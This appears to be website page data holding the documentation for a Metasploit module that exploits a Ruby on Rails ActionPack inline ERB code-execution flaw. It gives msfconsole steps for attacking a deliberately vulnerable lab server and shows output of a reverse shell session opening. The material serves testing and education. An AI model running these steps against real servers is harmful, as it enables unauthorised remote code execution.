{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/rails_actionpack_inline_exec","result":{"data":{"moduleMetadataJson":{"id":"f6ab507c-5faa-57dd-b221-709410a1a6f3","name":"Ruby on Rails ActionPack Inline ERB Code Execution","fullname":"exploit/multi/http/rails_actionpack_inline_exec","description":"This module exploits a remote code execution vulnerability in the\n        inline request processor of the Ruby on Rails ActionPack component.\n        This vulnerability allows an attacker to process ERB to the inline\n        JSON processor, which is then rendered, permitting full RCE within\n        the runtime, without logging an error condition.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/rails_actionpack_inline_exec","documentationSlug":"/modules/documentation/exploit/multi/http/rails_actionpack_inline_exec","referencesSlug":"/modules/references/exploit/multi/http/rails_actionpack_inline_exec"},"documentation":{"html":"<p>rails<em>actionpack</em>inine_exec is a module that exploits the render method in Action Pack.\nApplications that pass unverified user input to the <code class=\"language-text\">render</code> method in a controller\nor view may be vulnerable to code injection.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Action Pack versions prior to 3.2.22.2, 4.1.14.2, and 4.2.5.2 use unsafe dynamic rendering.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>Assuming you have the right requirements to run a rails server, you can use the following fork\nto set up the vulnerable server for testing:</p>\n<ol>\n<li>Do: <code class=\"language-text\">git clone https://github.com/wchen-r7/dh-CVE_2016_2098.git</code></li>\n<li>Do: <code class=\"language-text\">bundle install</code></li>\n<li>Do: <code class=\"language-text\">rails -s -b 0.0.0.0</code></li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/multi/http/rails_actionpack_inline_exec</code></li>\n<li>Do: <code class=\"language-text\">set RHOST [rails server IP]</code></li>\n<li>Do: <code class=\"language-text\">set RPORT 3000</code>. 3000 is the default port for the rails server.</li>\n<li>Do: <code class=\"language-text\">set targeturi /exploits</code></li>\n<li>Configure the rest of the options (for the modules or the payload)</li>\n<li>Do: <code class=\"language-text\">exploit</code>, and you should get a session:</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(rails_actionpack_inline_exec) &gt; run\n\n[*] Started reverse TCP handler on 192.168.146.1:4444 \n[*] Sending inline code to parameter: id\n[*] Command shell session 1 opened (192.168.146.1:4444 -&gt; 192.168.146.161:56661) at 2016-07-07 15:56:00 -0500</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>To use this module, you must manually discover the correct values for these datastore options:</p>\n<p><strong>TARGETURI</strong></p>\n<p>The path to a vulnerable Ruby on Rails application.</p>\n<p><strong>TARGETPARAM</strong></p>\n<p>The target parameter to inject with inline code.</p>"}}},"pageContext":{"id":"f6ab507c-5faa-57dd-b221-709410a1a6f3"}}}